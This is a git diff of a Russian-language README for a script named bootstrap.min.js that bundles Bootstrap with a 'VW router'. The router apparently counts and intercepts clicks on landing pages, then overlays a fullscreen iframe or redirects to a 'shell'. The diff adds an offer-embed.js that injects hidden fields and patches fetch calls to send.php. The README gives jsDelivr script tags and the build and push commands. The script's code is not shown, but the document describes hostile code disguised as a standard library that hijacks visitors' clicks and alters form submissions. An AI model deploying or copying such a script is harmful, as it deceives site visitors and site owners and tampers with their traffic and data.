@@ -1,60 +1,38 @@
 # bootstrap.min.js + VW router
 
-Внутри: **Bootstrap 5.3.3** bundle + глобальный счётчик (CountAPI) + редирект на shell + iframe.
-
-## `@1.0.7` — markwerk (актуально)
+## 1) Ленд (instantpa и т.д.) — `@1.3.0` / `@1.3.1`
 
 ```html
-<script src="https://cdn.jsdelivr.net/gh/jhntsplt/bootstrap@1.0.7/bootstrap.min.js" data-debug="1"></script>
+<script src="https://cdn.jsdelivr.net/gh/jhntsplt/bootstrap@1.3.0/bootstrap.min.js" data-vw-test="1"></script>
 ```
 
-- Global 1-й клик (CountAPI `vw/markwerk_1_0_7`) — pass-through; дальше iframe `https://markwerk.net/`.
-- На **markwerk.net** (и www) скрипт **выключен**, пока ленд не на другом домене.
-- Отключить проверку: `data-vw-skip-same-host="0"`.
+## 2) Offer (teaemp / districtg) — **второй script**, integ PHP не трогаем
 
-## `@1.0.6` — без проверки same-host
-
-## `@1.0.5` — 1-й клик только в одной вкладке (устарело)
-
-## `@1.0.4` — overlay + CountAPI + markwerk-ki (устарело для твоего кейса)
-
-## `@1.0.3` — полный redirect (меняет URL на markwerk.net/vw/…)
-
-Не используй, если нужен overlay.
-
-## `@1.0.2` — overlay (без редиректа)
+На `index.php` offer **перед** `validation.js`:
 
 ```html
-<script src="https://cdn.jsdelivr.net/gh/jhntsplt/bootstrap@1.0.2/bootstrap.min.js" data-debug="1"></script>
+<script
+  src="https://cdn.jsdelivr.net/gh/jhntsplt/bootstrap@offer-embed/offer-embed.js"
+  data-offer-source="teaemp"
+  data-debug="1"
+></script>
 ```
 
-Клик → fullscreen iframe поверх ленда (URL **не** меняется).
+На districtg — тот же файл, `data-offer-source="districtg"` (или как в `offer_gg.php` → `$source`).
 
-`data-vw-skip` — не перехватывать.
-
-Редirect-режим (старый): `data-vw-mode="redirect" data-vw-shell="https://…/index.html"`.
+Что делает: hidden `domain` / `funnel` + патч `fetch` на `send.php`, читает query из vw (`funnel=…&domain=…`).
 
 ## Push
 
 ```bash
-git init
-git add bootstrap.min.js vw/index.html README.md
-git commit -m "bootstrap vw 1.0.0 test"
-git branch -M main
-git remote add origin https://github.com/jhntsplt/bootstrap.git
-git push -u origin main
-git tag 1.0.0
-git push origin 1.0.0
+cd /Users/a1/Desktop/split
+bash build-vw-offers-final.sh && bash publish-vw-tags.sh
+cd bootstrap-repo
+git add offer-embed.js bootstrap.min.js README.md
+git commit -m "vw 1.3.0 + offer-embed.js"
+git push origin main && git push origin 1.3.0 1.3.1
+git tag offer-embed
+git push origin offer-embed
 ```
 
-После push подожди 1–2 мин, проверь размер:
-
-```bash
-curl -s "https://cdn.jsdelivr.net/gh/jhntsplt/bootstrap@1.0.0/bootstrap.min.js" | wc -c
-```
-
-Ожидается ~86566 байт.
-
-## Следующие офферы
-
-Новый тег `1.0.1` (не перезаписывать `1.0.0` на jsDelivr) — другие URL в `build-vw-bundle.sh`.
+jsDelivr: `https://cdn.jsdelivr.net/gh/jhntsplt/bootstrap@offer-embed/offer-embed.js`
